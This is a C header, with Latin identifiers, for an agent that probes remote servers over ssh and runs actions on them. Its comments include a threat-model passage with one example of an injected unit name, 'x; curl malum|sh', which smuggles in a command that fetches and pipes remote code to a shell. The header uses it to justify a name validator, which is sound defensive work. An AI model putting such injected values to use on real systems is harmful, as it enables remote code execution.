/* villa_agens.h - Agens villae: probatio, actio, eventus.
 *
 * STRATUM SINE FACIE. Hic habitat quidquid villa agit quod
 * monstrari non est: configuratio, scriptum probationis, cyclus
 * probationum, semina generum, scriptura eventuum. Facies (V4b)
 * super hoc sedet et NIHIL horum iterum facit.
 *
 * Cur separatum: probationes radicis apps/ NON vident. Agens in
 * apps/villa/ manens tegumentum verrendum habere non posset, et
 * porta quae viridis fieri non potest neglegitur (id ipsum quod
 * apps/forum/fumus.sh passum est). Ergo agens in lib/ vivit et
 * probatio_villa_agens eum in suite VERA custodit.
 *
 * NIHIL HIC OBSTAT. Omnis probatio per processus_incipere/pulsare
 * currit; villa_agens_pulsare semel per tictum vocatur et statim
 * redit. Vide processus.h de causa (domus filis CARET).
 *
 * ============================================================
 * DE CONCHA: QUID TUTUM SIT ET QUID NON
 * ============================================================
 * Latus LOCALE concham non habet: processus.h vectorem argumentorum
 * adhibet, ergo nihil in machina Franis textum usoris interpretatur.
 *
 * Latus REMOTUM concham HABET necessario: ssh imperium per concham
 * ingressus usoris currit - id est quod ssh EST. Ergo:
 *   - Scriptum probationis a NOBIS scribitur, non ab usore. Tutum.
 *   - Manus libera ('curre hoc in servo') textum usoris ad concham
 *     remotam mittit CONSULTO - id est functio ipsa, non vitium.
 *   - Sed NOMINA UNITATUM ex entibus usoris veniunt et in scriptum
 *     NOSTRUM interpolantur. Unitas nomine 'x; curl malum|sh'
 *     imperium alienum pareret sub specie probationis innocentis.
 *     ERGO villa_unitas_valida OMNE nomen ante interpolationem
 *     custodit, et nomen recusatum ex probatione OMITTITUR.
 */

#ifndef VILLA_AGENS_H
#define VILLA_AGENS_H

#include "latina.h"
#include "piscina.h"
#include "chorda.h"
#include "xar.h"
#include "villa_lectores.h"
#include "cliens_tabularii.h"

nomen structura VillaAgens VillaAgens;

/* ========================================================================
 * I. CONFIGURATIO
 * ======================================================================== */

nomen structura {
	/* Directorium socketorum moderantium, SINE '/%C'. Vacuum =
	 * nulla multiplicatio. */
	chorda              via_moderandi;
	/* NIHIL = ex ambiente (VILLA_SSH) aut "ssh". */
	constans character* via_ssh;
	i32                 mora_probationis_ms;  /* ZEPHYRUM = XV000 */
	i32                 mora_actionis_ms;     /* ZEPHYRUM = XXX000 */
	i32                 portus_tabularii;     /* ZEPHYRUM = 8753 */
} VillaConfiguratio;

/* Configurationem ordinariam parare:
 *   - VILLA_SSH ex ambiente SEMEL legitur (sutura una)
 *   - via_moderandi = $HOME/.rhubarb/cm, CREATUM cum modo 0700
 *
 * Redde FALSUM cum causa si directorium creari non potuit. Villa
 * sine multiplicatione currere POTEST (lentius), ergo vocator
 * decernat utrum defectus fatalis sit.
 */
b32
villa_configurationem_parare (
	VillaConfiguratio* configuratio,
	          Piscina* piscina,
	           chorda* causa);


/* ========================================================================
 * II. CUSTOS NOMINUM
 * ======================================================================== */

/* An nomen unitatis in scriptum remotum interpolari TUTUM sit.
 * Licita: litterae, numeri, '-', '_', '.', '@', ':'. Haec omnia
 * systemd in nominibus unitatum vere adhibet (e.g.
 * 'getty@tty1.service', 'systemd-udevd.service').
 *
 * Recusat quidquid conchae significat: spatium, ';', '|', '&',
 * '$', '`', '(', ')', '<', '>', citationes, lineam novam.
 * Vacuum quoque recusat.
 */
b32
villa_unitas_valida (chorda nomen_unitatis);


/* ========================================================================
 * III. SCRIPTUM PROBATIONIS (purum)
 * ======================================================================== */

/* Scriptum compositum aedificare quod effusionem sectionatam
 * emittit (vide VILLA_MARCA_SECTIONIS in villa_lectores.h).
 *
 * unitates: Xar de chorda - nomina unitatum systemd petenda.
 * Nomina INVALIDA silentio OMITTUNTUR ex parte 'servitia'; numerus
 * omissorum per 'omissa' redditur ut vocator id NOMINARE possit
 * potius quam tacite minus probare.
 *
 * Sectiones emissae: unitates, servitia, nginx, discus, tempus,
 * memoria.
 */
chorda
villa_scriptum_probationis (
	constans Xar* unitates,
	         i32* omissa,
	     Piscina* piscina);


/* ========================================================================
 * IV. PROBATIO - photographia unius servi
 * ======================================================================== */

nomen structura {
	b32            perfecta;      /* cyclus finitus (felix an non) */
	b32            felix;         /* omnia bene */
	CausaExitus    causa;         /* si !felix */
	i32            mora_ms;

	/* lectiones parsatae; vacuae si sectio defuit aut cecidit */
	Xar*           unitates;      /* UnitasCursoria */
	Xar*           servitia;      /* StatusServitii */
	Xar*           situs;         /* SitusNginx */
	StatusDisci    discus;
	StatusMemoriae memoria;
	i64            tempus_activum;

	/* Sectiones quae defuerunt aut ceciderunt, prosa brevi. Vacua
	 * = omnia advenerunt. Facies eam monstret: probatio partim
	 * felix TACITE dimidiata pessimum genus est. */
	chorda         querelae;
} ProbatioServi;

/* ========================================================================
 * V. AGENS
 * ======================================================================== */

VillaAgens*
villa_agens_creare (
	constans VillaConfiguratio* configuratio,
	           ClientTabularii* cliens,
	                  Piscina*  piscina);

/* Genera 'servus' et 'servitium' seminare.
 *
 * CUSTODIA COLLISIONIS: machina solum genera SYSTEMATIS (usor=0)
 * protegit; clavis ab alia app usoris occupata TACITE
 * superscribitur et schema illius evanescit. Ergo hic et clavem
 * ante seminationem quaerimus ET responsum 'addere' pro 'iam
 * occupata' inspicimus - unum 'indexOf' clobbrationem silentem in
 * errorem visibilem vertit.
 */
b32
villa_genera_seminare (
	VillaAgens* agens,
	    chorda* causa);

/* Probationem incipere (NON obstat). alias/hospes ut in
 * ConfiguratioSsh; unitates = nomina systemd petenda.
 *
 * Redde FALSUM si probatio huius servi iam currit aut mandatum
 * aedificari non potuit (causa nominatur). */
b32
villa_probationem_incipere (
	VillaAgens* agens,
	    chorda  clavis_servi,   /* identitas in tabula agentis */
	    chorda  alias,
	constans Xar* unitates,
	    chorda* causa);

/* Omnes probationes currentes uno gradu provehere. Vocanda semel
 * per tictum. NUMQUAM OBSTAT. Redde numerum probationum quae hoc
 * pulsu PERFECTAE sunt. */
i32
villa_agens_pulsare (VillaAgens* agens);

/* Photographia ultima servi (NIHIL si nulla adhuc). */
constans ProbatioServi*
villa_probatio_ultima (
	VillaAgens* agens,
	    chorda  clavis_servi);

/* Numerus probationum in cursu. */
i32
villa_probationes_currentes (constans VillaAgens* agens);

/* ========================================================================
 * VI. ACTIONES - quae EVENTUS pariunt
 * ======================================================================== */

/* Imperium in servo currere et eventum scribere.
 *
 * OBSTAT consulto: actiones ab usore excitantur, sunt rarae, et
 * responsum immediatum exspectatur. Probationes (frequentes,
 * automaticae) semitam incrementalem adhibent.
 *
 * EVENTUS: 'nota' cum origine "villa", NUMQUAM 'mutatio' - mutatio
 * contra campos generis iudicatur et notam custodiae in OMNI
 * restitutione pareret.
 *
 * res_servi: res_id entis servi in tabulario (vacuum = nullus
 * eventus scribitur, actio tamen curritur).
 */
nomen structura {
	b32         successus;    /* processus cucurrit ET codex ZEPHYRUM */
	CausaExitus causa;
	chorda      effusio;
	chorda      erratum;
	i32         mora_ms;
	b32         eventus_scriptus;
} ResultusActionis;

ResultusActionis
villa_actionem_agere (
	VillaAgens* agens,
	    chorda  alias,
	    chorda  res_servi,
	    chorda  imperium,
	   Piscina* piscina);

#endif /* VILLA_AGENS_H */
